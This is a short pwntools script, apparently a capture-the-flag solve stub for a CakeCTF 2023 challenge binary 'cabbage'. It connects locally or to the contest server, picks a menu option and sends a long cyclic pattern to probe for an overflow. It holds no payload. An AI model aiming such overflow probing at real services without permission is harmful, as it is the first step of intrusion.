#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./cabbage", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc memorialcabbage.2023.cakectf.com 9001"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

io.sendline(b"1")
pause()
io.sendline(cyclic(0xfff))

io.interactive()
